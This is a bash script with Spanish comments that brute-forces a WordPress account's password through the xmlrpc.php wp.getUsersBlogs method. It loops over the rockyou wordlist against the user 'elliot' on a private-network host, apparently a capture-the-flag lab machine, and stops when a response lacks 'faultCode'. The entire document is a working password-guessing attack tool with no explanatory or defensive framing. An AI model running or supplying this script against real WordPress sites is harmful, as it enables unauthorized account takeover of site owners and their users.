#!/bin/bash

function salir(){
        exit 1
}

trap salir SIGINT 

for i in $(cat /usr/share/wordlists/rockyou.txt); do
        variable=$(cat <<FIN
<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>elliot</value></param>
<param><value>$i</value></param>
</params>
</methodCall>
FIN
        )

        echo -e "$variable" >> enviar.xml
        echo -e "[+] Probamos con la contraseña $i"

        curl -s -X POST 'http://10.0.2.8/xmlrpc.php' -d@enviar.xml >> log.log

        if [  ! "$(cat log.log | grep 'faultCode')"  ]; then
                echo -e "[+] La contraseña para elliot es $i"
                exit 0
        fi

        sleep 1

rm log.log enviar.xml

done